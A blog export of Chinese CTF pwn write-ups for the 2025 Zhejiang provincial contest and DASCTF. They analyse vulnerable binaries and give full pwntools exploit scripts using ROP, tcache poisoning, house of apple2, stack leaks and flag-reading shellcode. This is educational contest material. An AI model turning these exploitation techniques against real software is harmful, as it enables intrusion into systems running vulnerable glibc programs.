[{"title":"2025浙江省省赛-决赛-wp","url":"/2025/11/16/2025%E6%B5%99%E6%B1%9F%E7%9C%81%E7%9C%81%E8%B5%9B-%E5%86%B3%E8%B5%9B-wp/","content":"题目链接https://github.com/yfor-yfor/-/tree/main/2025%E6%B5%99%E6%B1%9F%E7%9C%81%E7%9C%81%E8%B5%9B-%E5%86%B3%E8%B5%9B\n\n前言wp的内容都是比赛时的做法，只是为了快速的出题，并不一定是最好的解法\n2，3题都有别的做法，可以去a1的公众号看一路生师傅的题解，写的很好\nmips_pwn_challenge一道mips 32位大端序题目\nmips架构最大的特点就是不支持nx保护，同时这道题输入255就可以泄露栈地址\n泄露栈地址后，调试返回地址与泄露地址的固定偏移打ret2shellcode即可\nfrom pwn import *from bisect import *context(arch=&quot;mips&quot;, os=&quot;linux&quot;, endian=&quot;big&quot;, word_size=32, log_level=&quot;debug&quot;)io=remote(&quot;10.1.100.90&quot;,9999)#io=process(argv=[&#x27;qemu-mips&#x27;,&#x27;-L&#x27;,&#x27;/usr/mips-linux-gnu/&#x27;,&#x27;./pwn&#x27;])#io=process(argv=[&#x27;qemu-mips&#x27;,&#x27;-g&#x27;,&#x27;6666&#x27;,&#x27;-L&#x27;,&#x27;/usr/mips-linux-gnu/&#x27;,&#x27;./pwn&#x27;])io.recvuntil(b&#x27;input number of magic\\n&#x27;)io.sendline(b&#x27;255&#x27;)io.recvuntil(b&#x27;gift: &#x27;)stack=int(io.recv(10),16)shellcode=asm(shellcraft.sh())offset=0x2cpayload=b&#x27;a&#x27;*(offset)+p32(stack+0x30)+shellcodeio.sendline(payload)io.interactive()\n\neasy calc一道计算题，猜测漏洞点可能在数字与符号的组合中\n模糊测试可以发现：不同的数字符号组合会在vuln函数的返回地址后留下不同的数据\n而rsp+8的位置是我们整个计算的结果，所以可以通过-1再加上一个数字，造成上溢修改到rsp处的值也就是返回地址\n在我的几个方案的测试后发现规律如下：\n-1+a+((b-c)/1)+cd/d最后的结果会是rsp：   arsp+8： brsp+16: crsp+24: d\n\n知道了如何控制返回地址就开始我们的rop链构造\n第一次构造pop rdi puts_got puts_plt main的链子，泄露libc并且重新计算一次\n第二次构造pop rdi shell ret system的链子\n由于这个控制方法的弊端是rsp+16处的值会是最后一个除法的商，就需要填入ret*system的结果，显然超过了p64的范围\n因此换一条链子pop rdi shell system+offset 1的链子\n这样最后的计算的除数是1就不会有影响了，只是为了满足64位栈堆平衡，需要取system后方一点的地方，让他少push一次，就可以满足平衡\n可以自行测试别的组合的规律，能找到更适合更方便的构造方式\nfrom pwn import *context( arch=&quot;amd64&quot;, os=&quot;linux&quot;)#io = process(&quot;./pwn&quot;)io=remote(&quot;10.1.100.196&quot;,8888)elf=ELF(&#x27;./pwn&#x27;)libc=ELF(&#x27;./libc.so.6&#x27;)def dbg():    gdb.attach(io)    pause()pop_rdi=0x402330puts=0x401676#溢出+和+末尾商+末尾除payload=b&#x27;-1&#x27;payload+=b&#x27;+&#x27;+str(pop_rdi).encode()payload+=b&#x27;+(&#x27;+str(elf.got[&#x27;puts&#x27;]-(elf.plt[&#x27;puts&#x27;]-4)).encode()+b&#x27;/1)&#x27;payload+=b&#x27;+&#x27;+str((elf.plt[&#x27;puts&#x27;]-4)*0x401531).encode()payload+=b&#x27;/&#x27;+str(0x401531).encode()io.sendline(payload)io.recvuntil(b&#x27;4214808\\n&#x27;)libc_base=u64(io.recv(6).ljust(8,b&#x27;\\x00&#x27;))-0x84420info(&quot;libc_base: &quot;+hex(libc_base))#dbg()system=libc_base+libc.sym[&#x27;system&#x27;]-0x5besh=libc_base+next(libc.search(b&#x27;/bin/sh\\x00&#x27;))info(sh)ret=libc_base+next(libc.search(asm(&#x27;ret;&#x27;),executable=True))payload=b&#x27;-1&#x27;payload+=b&#x27;+&#x27;+str(pop_rdi).encode()payload+=b&#x27;+(&#x27;+str(sh-system).encode()+b&#x27;/1)&#x27;payload+=b&#x27;+&#x27;+str(system).encode()payload+=b&#x27;/&#x27;+str(1).encode()io.sendline(payload)io.interactive()\n\n\n\nonly_one只有add和delete，有一次uaf的机会，2.31版本\n因此，泄露必须要打stdout\n之后的利用方法需要两个小技巧，算非预期，但是更快，更节省add次数\n申请0-8的chunck，释放2-8填满tcachebin，释放1（uaf），再释放0，申请一个chunck，再释放1，让1进入tcachebin\n此流程跟初赛pwn3流程一样，核心思路就是，要造成一个chunck同时在unsorted bin和tcache bin，必须先让他进入unsorted bin，再进入tcache bin，而进入tcache bin会破坏他的fd bk，所以用chunck0合并chunck1来保护unsorted bin\n之后为了能够做到tcache poison，就需要两个chunck切割掉chunck0（因为申请跟chunck0大小相同的chunck，会从tcache bin中取）\n这样我们的chunck0就因为unsorted bin的切割更新，有了libc地址作为fd bk，观察到他的fd与_IO_2_1_stdout_只有末两字节不同，因此覆盖末两位就可以，在开启了aslr的情况下有1&#x2F;16的概率成功申请到_IO_2_1_stdout_\n这时候用到技巧1：\n我们之前申请的chunck都是0x100大小的，实际大小会是0x110，此时我们想要绕过tcache bin申请到他的话，可以申请0xf0大小，由于unsorted bin的机制，以及0x10大小的chunck是不存在的，所以会直接申请到这个堆块\n这样就可以快速的修改他的fd了\n技巧2：\n我们不把目标地址改为_IO_2_1_stdout_，而是改为_IO_2_1_stderr_的chain上，这个chain指向的就是_IO_2_1_stdout_。这样子我们后续的申请就会先申请到chain的位置，再申请到_IO_2_1_stdout_的位置\n而由于我们不会主动刷新程序执行流，也不会调用错误输出，_IO_2_1_stderr_即便受损也不会影响程序运行，直接暴力覆盖到_IO_2_1_stdout_开头，然后用p64(0xfbad1800)+p64(0)*3+p8(0)泄露libc\n再一次申请就可以直接申请到_IO_2_1_stdout_了，此时打house of apple2即可在后续的menu中触发攻击链成功get shell\nfrom pwn import *context( arch=&quot;amd64&quot;, os=&quot;linux&quot;)io=process(&#x27;./pwn&#x27;)#io=remote(&quot;10.1.100.82&quot;,9999)libc=ELF(&#x27;./libc.so.6&#x27;)def dbg():    gdb.attach(io)    pause()def cmd(choice):    io.recvuntil(b&#x27;&gt; &#x27;)    io.sendline(str(choice).encode())def add(size,data):    cmd(1)    io.recvuntil(b&#x27;yours Size: &#x27;)    io.sendline(str(size).encode())    io.recvuntil(b&#x27;Please enter yours Content: &#x27;)    io.send(data) def delete(index):    cmd(2)    io.recvuntil(b&#x27;yours Index: &#x27;)    io.sendline(str(index).encode())def only(index):    cmd(999)    io.recvuntil(b&#x27;only one for you: &#x27;)    io.sendline(str(index).encode())for i in range(9):    add(0x100,b&#x27;aaa&#x27;)#0~8for i in range(7):    delete(2+i)#2~8 tcache only(1)delete(0)add(0x100,b&#x27;aaa&#x27;)#9delete(1)add(0x70,b&#x27;aaa&#x27;)#10add(0x80,b&#x27;aaa&#x27;)#11add(0xf0,p16(0x2628))#12add(0x100,b&#x27;aaa&#x27;)#13#dbg()payload=b&#x27;\\x00&#x27;*(0x78)+p64(0xfbad1800)+p64(0)*3+p8(0)add(0x100,payload)#14io.recvline()io.recv(8)libc_base=u64(io.recv(6).ljust(8,b&#x27;\\x00&#x27;))-0x1ec980info(hex(libc_base))stdout=libc_base+libc.sym[&#x27;_IO_2_1_stdout_&#x27;]wfile_jumps=libc_base+0x1e8f60io_file = flat(    b&#x27; sh;&#x27;,             p32(0),              p64(0)*4,             p64(libc_base + libc.sym[&#x27;system&#x27;]),  #_IO_write_ptr     p64(0)*11,            p64(libc_base +0x1ee7e0),            #_IO_stdfile_1_lock    p64(0)*2,             p64(stdout - 0x40),                        #_wide_data    p64(0)*6,             p64(wfile_jumps)                           #vtable)#dbg()add(0x100,io_file)io.interactive()\n\n","tags":["wp"]},{"title":"2025浙江省省赛-初赛-wp","url":"/2025/11/10/2025%E6%B5%99%E6%B1%9F%E7%9C%81%E7%9C%81%E8%B5%9B-%E5%88%9D%E8%B5%9B-wp/","content":"题目链接https://github.com/yfor-yfor/-/tree/main/2025%E6%B5%99%E6%B1%9F%E7%9C%81%E7%9C%81%E8%B5%9B-%E5%88%9D%E8%B5%9B\n\nrop题目分析有input和output两个函数，函数的参数是s\n对s构造如下结构体后方便分析,由一个数组和一个变量index组成\nstruct arr&#123;__int64 arr[9]; __int64 index;&#125;;\n\ninput\nunsigned __int64 __fastcall input(arr *s)&#123;  __int64 index; // [rsp+18h] [rbp-38h]  char sa[40]; // [rsp+20h] [rbp-30h] BYREF  unsigned __int64 canary; // [rsp+48h] [rbp-8h]  canary = __readfsqword(0x28u);  index = s-&gt;index;  if ( index &lt;= 9 )  &#123;    puts(&quot;input your number:&quot;);    fgets(sa, 24, stdin);    s-&gt;arr[index] = atoll(sa);    ++s-&gt;index;  &#125;  else  &#123;    puts(&quot;input error&quot;);  &#125;  return __readfsqword(0x28u) ^ canary;&#125;\n\n漏洞点在于，当我们input8次后，s-&gt;index变成9，此时输入的number会写到s-&gt;index里，这时候我们就可以控制下次读入的位置了\n而if的检查只检查上限，因此可以令s-&gt;index为一个负数值来修改负数下标处的内容\n而s结构体的地址在main函数的栈帧上，因此我们有了在栈上任意写的能力\noutput\nunsigned __int64 __fastcall output(arr *s)&#123;  __int64 index; // [rsp+10h] [rbp-10h] BYREF  unsigned __int64 canary; // [rsp+18h] [rbp-8h]  canary = __readfsqword(0x28u);  puts(&quot;index:&quot;);  __isoc99_scanf(&quot;%lld&quot;, &amp;index);  getchar();  if ( index &lt;= 9 )  &#123;    puts(&quot;your number:&quot;);    printf(&quot;%lld\\n&quot;, s-&gt;arr[index]);    s-&gt;arr[index] = 0LL;    --s-&gt;index;  &#125;  else  &#123;    puts(&quot;output error&quot;);  &#125;  return __readfsqword(0x28u) ^ canary;&#125;\n\noutput也同样不检查index的下限，根据之前分析的可知，s在栈上，只要我们输入一个&lt;&#x3D;9的值，就可以泄露低地址处栈上的值，比如libc\n攻击思路实际的攻击更加简单，都不用覆写index\ngdb调试input的内容可以发现\npwndbg&gt; tele 0x7fffffffde00  1500:0000│-070     0x7fffffffde00 —▸ 0x401190 ◂— endbr64 01:0008│ rsp     0x7fffffffde08 —▸ 0x401523 ◂— jmp 0x4014cc //返回地址02:0010│ rax rdi 0x7fffffffde10 ◂— 0                        //s-&gt;arr[0]... ↓            9 skipped                                  //s-&gt;arr[1~8]&amp;s-&gt;index 0c:0060│-010     0x7fffffffde60 —▸ 0x7fffffffdf60 ◂— 10d:0068│-008     0x7fffffffde68 ◂— 0xab2679a5e8c33c000e:0070│ rbp     0x7fffffffde70 ◂— 0pwndbg&gt; x $rdi0x7fffffffde10:\t0x00000000\n\n也就是我们可以直接在返回地址附近写入攻击内容\n先通过output泄露libc\n再开始input的布置，由于output会让index-1，此时修改的位置就是返回地址，所以把返回地址的值复原回去\n之后我们就可以布置返回地址后方的攻击链了\n也就是从arr[0]开始，理论上来说应该是\narr[0]:sharr[1]:retarr[2]:system\n\n此时再通过多次output，令index&#x3D;-1\n写入arr[-1]:pop_rdi_ret 即劫持返回地址来触发完整攻击链\n不过后续发现，output会把arr[0]清零，但是也很好处理，如下布置即可：\narr[-1]:pop_rdi_retarr[0]:0arr[1]:pop_rdiarr[2]:sharr[3]:retarr[4]:system\n\nexpfrom pwn import *context(arch=&#x27;amd64&#x27;,os=&#x27;linux&#x27;)io=process(&#x27;./pwn&#x27;)libc=ELF(&#x27;./libc.so.6&#x27;)def dbg():    gdb.attach(io)    pause()def cmd(choice):    io.recvuntil(b&#x27;&gt;&gt;&#x27;)    io.sendline(str(choice).encode())def input(data):    cmd(1)    io.recvuntil(b&#x27;input your number:&#x27;)    io.sendline(str(data))def output(index):    cmd(2)    io.recvuntil(b&#x27;index:&#x27;)    io.sendline(str(index))output(-13)io.recvuntil(b&#x27;your number:\\n&#x27;)libc_base=int(io.recv(15))-0x8459ainfo(&quot;libc_base: &quot;+hex(libc_base))system=libc_base+libc.sym[&#x27;system&#x27;]sh=libc_base+next(libc.search(b&#x27;/bin/sh\\x00&#x27;),)pop_rdi=libc_base+next(libc.search(asm(&#x27;pop rdi;ret&#x27;),executable=True))ret=libc_base+next(libc.search(asm(&#x27;ret;&#x27;),executable=True))input(0x401523)#dbg()input(0)input(pop_rdi)input(sh)input(ret)input(system)for i in range(6):    output(0)input(pop_rdi)io.interactive()\n\n\n\none题目分析开头有一个简单的检验，伪随机数绕过即可\nint login()&#123;  unsigned int seed; // eax  int v2; // [rsp+0h] [rbp-10h]  int v3; // [rsp+4h] [rbp-Ch]  seed = time(0LL);  srand(seed);  v2 = rand() % 200;  v3 = rand() % 100;  puts(&quot;Let me know if u are not a rebot.&quot;);  printf(&quot;%d+%d=?\\n&quot;, v2, v3);  if ( v2 + v3 != (unsigned int)readint() )  &#123;    puts(&quot;Get out robot&quot;);    exit(1);  &#125;  return puts(&quot;Go on!&quot;);&#125;\n\n接下来是四个交互都有的常规堆，漏洞点在edit\nunsigned __int64 edit()&#123;  signed int n8; // [rsp+4h] [rbp-Ch] BYREF  unsigned __int64 v2; // [rsp+8h] [rbp-8h]  v2 = __readfsqword(0x28u);  puts(&quot;which one?&quot;);  __isoc99_scanf(&quot;%d&quot;, &amp;n8);  if ( (unsigned int)n8 &gt; 8 || !*((_QWORD *)&amp;clist + n8) )  &#123;    puts(&quot;sorry&quot;);    exit(1);  &#125;  puts(&quot;what to change?&quot;);  read(0, *((void **)&amp;clist + n8), slist[n8] + 1);  puts(&quot;Finish!&quot;);  return __readfsqword(0x28u) ^ v2;&#125;\n\n非常明显的off-by-one\n而且是2.31版本，检查不多，直接选择造成堆块复用然后打free_hook即可\n麻烦的是题目没给版本，不过简单的测试一下回显的结果，就能确定libc的版本范围了\n最后使用的是2.27-3ubuntu1.6_amd64这个版本的\nexpfrom pwn import *from ctypes import *context(arch=&#x27;amd64&#x27;,os=&#x27;linux&#x27;)io=process(&#x27;./pwn&#x27;)lib=CDLL(&#x27;./libc-2.27.so&#x27;)libc=ELF(&#x27;./libc-2.27.so&#x27;)def init():    time=lib.time(0)     lib.srand(time)    io.recvuntil(b&#x27;?\\n&#x27;)    io.sendline(str(lib.rand()%200+lib.rand()%100).encode())def dbg():    gdb.attach(io)    pause()def cmd(choice):    io.recvuntil(b&#x27;5.exit\\n&#x27;)    io.sendline(str(choice).encode())def add(index,size,data):    cmd(1)    io.recvuntil(b&#x27;the index of command?\\n&#x27;)    io.sendline(str(index).encode())    io.recvuntil(b&#x27;the size of command?\\n&#x27;)    io.sendline(str(size).encode())    io.recvuntil(b&#x27;the command?\\n&#x27;)    io.send(data)def delete(index):    cmd(2)    io.recvuntil(b&#x27;which one?\\n&#x27;)    io.sendline(str(index).encode())def edit(index,data):    cmd(4)    io.recvuntil(b&#x27;which one?\\n&#x27;)    io.sendline(str(index).encode())    io.recvuntil(b&#x27;what to change?\\n&#x27;)    io.send(data)def show(index):    cmd(3)    io.recvuntil(b&#x27;which one?\\n&#x27;)    io.sendline(str(index).encode())init()add(0,0x430,b&#x27;aaaa&#x27;)add(1,0x20,b&#x27;aaaa&#x27;)delete(0)add(0,0x20,b&#x27;aaaaaaaa&#x27;)show(0)libc_base=u64(io.recvuntil(b&#x27;\\x7f&#x27;)[-6:].ljust(0x8,b&#x27;\\x00&#x27;))-0x3ec0a0info(hex(libc_base))free_hook=libc_base+libc.sym[&#x27;__free_hook&#x27;]add(2,0x400,b&#x27;aaaa&#x27;)add(3,0x38,b&#x27;aaa&#x27;)add(4,0x38,b&#x27;aaa&#x27;)add(5,0x38,b&#x27;aaa&#x27;)edit(3,b&#x27;a&#x27;*(0x38)+p8(0x81))delete(3)delete(4)add(4,0x78,b&#x27;aaa&#x27;)delete(5)edit(4,b&#x27;a&#x27;*(0x38)+p64(0x41)+p64(free_hook))add(5,0x38,b&#x27;/bin/sh\\x00&#x27;)add(3,0x38,p64(libc_base+libc.sym[&#x27;system&#x27;]))delete(5)io.interactive()\n\n\n\nbad_heap题目分析有add，delete，show的2.35堆\nadd\n主要限制了堆块的大小&lt;&#x3D;0x400\n至于只能申请0x14个堆块倒是无所谓，因为并不检查哪些堆块是否正在使用，直接覆盖都可以\n唯一有意思的检查是，判断申请到的堆块是不是在libc范围内，是就exit，这个后续会提及应对方式\nunsigned __int64 add()&#123;  unsigned int n0x14_1; // ebx  unsigned int n0x14; // [rsp+0h] [rbp-20h] BYREF  _DWORD nbytes[5]; // [rsp+4h] [rbp-1Ch] BYREF  *(_QWORD *)&amp;nbytes[1] = __readfsqword(0x28u);  puts(&quot;input idx:&quot;);  __isoc99_scanf(&quot;%d&quot;, &amp;n0x14);  if ( n0x14 &gt;= 0x14 )    exit(0);  puts(&quot;input size:&quot;);  __isoc99_scanf(&quot;%d&quot;, nbytes);  if ( nbytes[0] &gt; 0x400u )    exit(0);  n0x14_1 = n0x14;  *((_QWORD *)&amp;list + 2 * (int)n0x14_1) = malloc(nbytes[0]);  if ( *((_QWORD *)&amp;list + 2 * (int)n0x14) &gt;= (unsigned __int64)libc_start    &amp;&amp; *((_QWORD *)&amp;list + 2 * (int)n0x14) &lt;= (unsigned __int64)libc_end )  &#123;    exit(0);  &#125;  dword_40A8[4 * n0x14] = nbytes[0];  puts(&quot;input content:&quot;);  read(0, *((void **)&amp;list + 2 * (int)n0x14), nbytes[0]);  return *(_QWORD *)&amp;nbytes[1] - __readfsqword(0x28u);&#125;\n\ndelete\n明显的uaf漏洞\nunsigned __int64 dele()&#123;  int v1; // [rsp+4h] [rbp-Ch] BYREF  unsigned __int64 v2; // [rsp+8h] [rbp-8h]  v2 = __readfsqword(0x28u);  puts(&quot;input idx:&quot;);  __isoc99_scanf(&quot;%d&quot;, &amp;v1);  if ( *((_QWORD *)&amp;list + 2 * v1) )    free(*((void **)&amp;list + 2 * v1));  else    puts(&quot;no!&quot;);  return v2 - __readfsqword(0x28u);&#125;\n\nshow是常规流程\n攻击流程通过合理的排布堆块，让同一个chunck同时在unsortedbin和tcachebin中\n再通过unsortedbin的合理切割，使得可以修改某个tcachebin中chunck的fd，完成tacahce posion即可\n至于关于libc的检查不用担心，只是禁用了io\n仍然有两种打法：\n\n通过tls_dtor_list劫持exit，但是题目没给ld文件，断网环境下也没有自配这个对应小版本的ld文件所以并没有使用\n利用environ攻击栈上返回地址，后续exp采用的就是这个方法\n\n值得一提的是，environ地址与libc的关系\nbss上的判断变量：libc_base &amp; libc_end10:0080│  0x555555558080 —▸ 0x7ffff7c00000 ◂— 0x3010102464c457f11:0088│  0x555555558088 —▸ 0x7ffff7e1c000 ◂— 0vmmap0x7ffff7c00000     0x7ffff7c28000 r--p    28000      0 libc.so.60x7ffff7c28000     0x7ffff7dbd000 r-xp   195000  28000 libc.so.60x7ffff7dbd000     0x7ffff7e15000 r--p    58000 1bd000 libc.so.60x7ffff7e15000     0x7ffff7e16000 ---p     1000 215000 libc.so.60x7ffff7e16000     0x7ffff7e1a000 r--p     4000 215000 libc.so.60x7ffff7e1a000     0x7ffff7e1c000 rw-p     2000 219000 libc.so.60x7ffff7e1c000     0x7ffff7e29000 rw-p     d000      0 [anon_7ffff7e1c]0x7ffff7fb8000     0x7ffff7fbd000 rw-p     5000      0 [anon_7ffff7fb8]pwndbg&gt; p &amp;environ$1 = (char ***) 0x7ffff7ffe2d0 &lt;environ&gt;可以观察到，libc_base和libc_end确实对应了libc的起点终点，但是environ并不在这个范围内，而是在anon段所以完全可以利用\n\n\n\n我们需要先通过第一次poison申请到environ向前一点的内容，send发送覆盖到environ处即可\n然后用show，使得覆盖的垃圾数据连带environ中存储的栈地址也泄露即可\n之后再一次poison申请到栈上，攻击栈的返回地址为我们的攻击链即可\nfrom pwn import * context(arch=&#x27;amd64&#x27;,os=&#x27;linux&#x27;)#log_level=&#x27;debug&#x27;,io=process(&#x27;./pwn&#x27;)libc=ELF(&#x27;./libc.so.6&#x27;)def dbg():    gdb.attach(io)    pause()def cmd(choice):    io.recvuntil(b&#x27;inputs your choice:\\n&#x27;)    io.sendline(str(choice).encode())def add(index,size,data=b&#x27;aaaa&#x27;):    cmd(1)    io.recvuntil(b&#x27;input idx:\\n&#x27;)    io.sendline(str(index))    io.recvuntil(b&#x27;input size:\\n&#x27;)    io.sendline(str(size))    io.recvuntil(b&#x27;input content:\\n&#x27;)    io.send(data)def delete(index):    cmd(2)    io.recvuntil(b&#x27;input idx:\\n&#x27;)    io.sendline(str(index))def show(index):    cmd(3)    io.recvuntil(b&#x27;input idx:\\n&#x27;)    io.sendline(str(index))for i in range(10):    add(i,0x200)for i in range(7):    delete(i)show(0)key=u64(io.recv(5).ljust(8,b&#x27;\\x00&#x27;))info(&quot;key: &quot;+hex(key))delete(7)show(7)libc_base=u64(io.recv(6).ljust(8,b&#x27;\\x00&#x27;))-0x21ace0info(&quot;libc_base: &quot;+hex(libc_base))stdout=libc_base+libc.sym[&#x27;_IO_2_1_stdout_&#x27;]info(&quot;stdout: &quot;+hex(stdout))environ=libc_base+libc.sym[&#x27;environ&#x27;]delete(8)add(0,0x200)delete(8)add(8,0x200)delete(8)add(7,0x220,b&#x27;a&#x27;*(0x200)+p64(0x210)*2+p64((environ-0x10)^(key+1)))add(8,0x200)add(10,0x200,b&#x27;a&#x27;*(0x10))show(10)io.recvuntil(b&#x27;a&#x27;*(0x10))stack=u64(io.recv(6).ljust(8,b&#x27;\\x00&#x27;))info(&quot;stack: &quot;+hex(stack))delete(7)delete(8)add(7,0x220,b&#x27;a&#x27;*(0x200)+p64(0x210)*2+p64((stack-0x148)^(key+1)))add(8,0x200)dbg()payload=p64(0)payload+=p64(libc_base+next(libc.search(asm(&#x27;pop rdi;ret&#x27;),executable=True)))payload+=p64(libc_base+next(libc.search(b&#x27;/bin/sh\\x00&#x27;)))payload+=p64(libc_base+next(libc.search(asm(&#x27;ret;&#x27;),executable=True)))payload+=p64(libc_base+libc.sym[&#x27;system&#x27;])add(11,0x200,payload)io.interactive()\n\n","tags":["wp"]},{"title":"2025dasctf-wp","url":"/2025/12/07/2025dasctf-wp/","content":"题目链接https://github.com/yfor-yfor/-/tree/main/2025dasctf\n\npwn1没给libc，但是测一下泄露和double free就能知道是2.27的libc\n之后就是简单的两次posion，泄露pie，libc等等，最后打hook为backdoor，注入shellcode即可\nfrom pwn import*context(arch = &#x27;amd64&#x27;)#io=process(&#x27;./pwn&#x27;)io=remote(&quot;node5.buuoj.cn&quot;,25406)libc=ELF(&#x27;./libc-2.27.so&#x27;)def dbg():    gdb.attach(io)    pause()def cmd(choice):    io.recvuntil(b&#x27;5.exit\\n&#x27;)    io.sendline(str(choice).encode())def add(index,size,data):    cmd(1)    io.recvuntil(b&#x27;which one do u want to connect:\\n&#x27;)    io.sendline(str(index).encode())    io.recvuntil(b&#x27;how much time do u want:\\n&#x27;)    io.sendline(str(size).encode())    io.recvuntil(b&#x27;plz input cmd:\\n&#x27;)    io.send(data)def delete(index):    cmd(2)    io.recvuntil(b&#x27;which connection do u want to delet:\\n&#x27;)    io.sendline(str(index).encode())def edit(index,data):    cmd(3)    io.recvuntil(b&#x27;which connection do u want to change:\\n&#x27;)    io.sendline(str(index).encode())    io.recvuntil(b&#x27;plz input ur cmd:\\n&#x27;)    io.send(data)def show(index):    cmd(4)    io.recvuntil(b&#x27;which connection do u want to show:\\n&#x27;)    io.sendline(str(index).encode())add(0,0x90,b&#x27;aaa&#x27;)add(1,0x90,b&#x27;aaa&#x27;)delete(0)delete(1)show(1)heap_addr=u64(io.recv(6).ljust(8,b&#x27;\\x00&#x27;))info(hex(heap_addr))edit(1,p64(heap_addr-0x1040))add(2,0x90,b&#x27;aaa&#x27;)add(3,0x90,b&#x27;a&#x27;)show(3)backdoor=u64(io.recv(6).ljust(8,b&#x27;\\x00&#x27;))-0x61+0xd8info(hex(backdoor))add(4,0x430,b&#x27;aaa&#x27;)add(5,0x80,b&#x27;aaa&#x27;)add(6,0x80,b&#x27;aaa&#x27;)delete(4)show(4)libc_base=u64(io.recv(6).ljust(8,b&#x27;\\x00&#x27;))-0x3ebca0info(hex(libc_base))delete(5)delete(6)edit(6,p64(libc_base+libc.sym[&#x27;__free_hook&#x27;]))add(7,0x80,b&#x27;aaa&#x27;)add(8,0x80,p64(backdoor))#dbg()delete(7)shellcode=asm(&#x27;&#x27;&#x27;xor rax, raxmov al, 2mov rdi, 0x67616c66push rdimov rdi, rspxor rsi, rsimov sil, 0x0xor rdx, rdxsyscallmov r10, raxxor rax, raxmov al, 0mov rdi, r10sub rsp, 0x100mov rsi, rspmov rdx, 0x100syscallxor rax, raxmov al, 1mov rdi, 1mov rsi, rspmov rdx, 0x50syscall&#x27;&#x27;&#x27;)io.sendline(shellcode)io.interactive()\n\n\n\npwn22.35的libc\n先是有一个login，r00t和一个base64加密，输入特定内容即可\n题目给了4个常规交互和一个backdoor\nbackdoor里面有uaf并且能泄露pie\n毕竟限制了chunck的size大小，所以打house of botcake即可\n值得注意的是，如果通过exit触发io的话会加沙箱，所以直接打stdout的house of apple2即可在menu中触发io，执行system(‘&#x2F;bin&#x2F;sh’)获得shell\nfrom pwn import*context(arch = &#x27;amd64&#x27;)#io=process(&#x27;./pwn&#x27;)io=remote(&quot;node5.buuoj.cn&quot;,29128)libc=ELF(&#x27;./libc.so.6&#x27;)def dbg():    gdb.attach(io)    pause()def login():    io.recvuntil(b&#x27;username:&#x27;)    io.sendline(&#x27;r00t&#x27;)    io.recvuntil(b&#x27;password:&#x27;)    io.sendline(&#x27;p9s3w0r6&#x27;)def cmd(choice):    io.recvuntil(b&#x27;Your choice:&#x27;)    io.sendline(str(choice).encode())def add(size,name=b&#x27;CCTTFFEERR!!&#x27;):    cmd(1)    io.recvuntil(b&#x27;Introduction length:&#x27;)    io.sendline(str(size).encode())    io.recvuntil(b&#x27;your name:&#x27;)    io.send(name)def edit(index,data):    cmd(2)    io.recvuntil(b&#x27;Which CV do you want to modify:&#x27;)    io.sendline(str(index).encode())    io.recvuntil(b&#x27;Please briefly introduce yourself:&#x27;)    io.send(data)def delete(index):    cmd(3)    io.recvuntil(b&#x27;Which CV do you want to remove:&#x27;)    io.sendline(str(index).encode())def show(index):    cmd(4)    io.recvuntil(b&#x27;Which CV do you want to view:\\n&#x27;)    io.sendline(str(index).encode())def backdoor(index):    cmd(666)    io.recvuntil(b&#x27;index:&#x27;)    io.sendline(str(index).encode())login()for i in range(9):    add(0x100) #0~8backdoor(1)io.recvline()pie=u64(io.recv(8))-0x51f0info(&quot;pie: &quot;+hex(pie))show(1)io.recvuntil(b&#x27;\\nintroduction:&#x27;)key=u64(io.recv(5).ljust(8,b&#x27;\\x00&#x27;))info(&quot;key: &quot;+hex(key))add(0x100)#9&amp;1for i in range(7):    delete(2+i)delete(1)#unsortedshow(9)io.recvuntil(b&#x27;\\nintroduction:&#x27;)libc_base=u64(io.recv(6).ljust(8,b&#x27;\\x00&#x27;))-0x21ace0info(&quot;libc_base: &quot;+hex(libc_base))stdout=libc_base+libc.sym[&#x27;_IO_2_1_stdout_&#x27;]wfile_jumps=libc_base+0x2170c0delete(0)add(0x100)#0delete(9)#unsorted &amp; tcacheinfo(hex(stdout^key))payload=b&#x27;a&#x27;*(0x108)+p64(0x111)+p64(stdout^key)add(0x120)#1edit(1,payload)add(0x100)add(0x100)io_file = flat(    b&#x27; sh;&#x27;,             p32(0),              p64(0)*4,             p64(libc_base + libc.sym[&#x27;system&#x27;]),  #_IO_write_ptr     p64(0)*11,            p64(libc_base + 0x21ca70),            #_IO_stdfile_1_lock    p64(0)*2,             p64(stdout - 0x40),                        #_wide_data    p64(0)*6,             p64(wfile_jumps)                           #vtable)edit(3,io_file)io.interactive()\n\n\n\npwn3vmpwn\n程序流程main函数中会打开vmcode文件，然后分别读取一些内容到s里和buf里，后续进入vm部分\nvoid __fastcall __noreturn main(__int64 a1, char **a2, char **a3)&#123;  int fd; // [rsp+Ch] [rbp-14h]  __int32 *buf; // [rsp+10h] [rbp-10h]  S *s; // [rsp+18h] [rbp-8h]  sub_25BD();  s = (S *)malloc(0x30uLL);  memset(s, 0, sizeof(S));  buf = (__int32 *)mmap(0LL, 0x30000uLL, 7, 34, -1, 0LL);  s-&gt;buf = buf;  fd = open(&quot;./vmcode&quot;, 0);  read(fd, &amp;s-&gt;ip, 4uLL);  while ( (unsigned int)read(fd, buf, 0x400uLL) )    buf += 256;  s-&gt;esp = 0x30000;  vm(s);&#125;\n\nvm函数\nvoid __fastcall __noreturn vm(S *s)&#123;  int n2; // eax  sa *sa; // [rsp+18h] [rbp-8h]  sa = (sa *)malloc(0xCuLL);  memset(sa, 0, 8uLL);  do  &#123;    if ( (unsigned int)init((buf *)s, sa) == -1 )      break;    n2 = sa-&gt;case_choice &amp; 3;    if ( n2 == 3 )    &#123;      case3(s, sa);    &#125;    else if ( (sa-&gt;case_choice &amp; 3u) &lt;= 3 )    &#123;      if ( n2 == 2 )      &#123;        case2(s, sa);      &#125;      else if ( (sa-&gt;case_choice &amp; 3) != 0 )      &#123;        case1(s, sa);      &#125;      else      &#123;        case0(s, sa);      &#125;    &#125;    memset(sa, 0, 0xCuLL);    if ( s-&gt;esp &gt; 0x30000u )      break;  &#125;  while ( s-&gt;ip &lt;= 0x30000 );  puts(&quot;Segment error&quot;);  _exit(0);&#125;\n\n会根据s中的内容，转化为对应指令并且执行\n区别于我们之前遇到的pwn题，指令由我们自己输入，这个pwn题的指令是由一开始的vmcode文件读入的，而他的功能也很简单\nwrite(1,&quot;What&#x27;s your name?&quot;,17)read(0,buf,0x50)write(1,&quot;hello &quot;,6)write(1,&quot;buf&quot;,length)\n\n当输入的长度超过0x18时，其实就会覆盖一些opcode，导致程序出现异常，要么在init段无法正常分析出choice，要么导致ip或esp大小不满足条件，最终输出segment error并且退出\n结构体struct S&#123;  __int32 *buf;//main中mmap的那一块地址的起始地址  uint32_t ip;//根据ip来寻找vmcode或者我们输入的opcode  __int32 rdi;//一堆reg，不过有用的就前三个  